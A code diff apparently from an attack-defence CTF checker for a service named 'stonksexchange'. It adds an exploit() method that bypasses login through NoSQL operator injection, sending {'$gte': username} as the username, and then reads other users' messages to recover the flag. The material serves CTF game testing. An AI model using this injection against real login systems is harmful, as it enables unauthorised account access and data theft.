@@ -1,5 +1,5 @@
 import secrets
-from typing import Tuple
+from typing import Optional, Tuple
 
 import enochecker
 
@@ -9,9 +9,10 @@ class StonksExchangeChecker(enochecker.BaseChecker):
     flag_variants = 1
     noise_variants = 2
     havoc_variants = 0
+    exploit_variants = 1
     service_name = "stonksexchange"
 
-    def putflag(self) -> None:
+    def putflag(self) -> Optional[str]:
         if self.variant_id > 0:
             raise enochecker.BrokenCheckerException(f"invalid variant_id in putflag: {self.variant_id}")
 
@@ -30,6 +31,8 @@ class StonksExchangeChecker(enochecker.BaseChecker):
             "username": usernameB,
             "password": passwordB,
         }
+
+        return None
 
     def getflag(self) -> None:
         if self.variant_id > 0:
@@ -94,8 +97,21 @@ class StonksExchangeChecker(enochecker.BaseChecker):
     def havoc(self) -> None:
         raise enochecker.BrokenCheckerException(f"invalid variant_id in havoc: {self.variant_id}")
 
-    def exploit(self) -> None:
-        pass
+    def exploit(self) -> str:
+        if self.variant_id > 0:
+            raise enochecker.BrokenCheckerException(f"invalid variant_id in exploit: {self.variant_id}")
+
+        username = "0" * 12 + secrets.token_hex(6)
+        password = secrets.token_hex(8)
+        r = self.http_post(route="/register", data={"username": username, "password": password,},)
+        assert r.ok
+        r = self.http_post(route="/login", json={"username": {"$gte": username,}, "password": password,},)
+        assert r.ok
+        r = self.http_get("/messages")
+        found_flag = self.search_flag(r.text)
+        if found_flag:
+            return found_flag
+        raise enochecker.BrokenServiceException("no flag found in exploit")
 
     def send_message(self, username: str, message: str) -> None:
         r = self.http_post(route="/message", data={"username": username, "message": message,},)
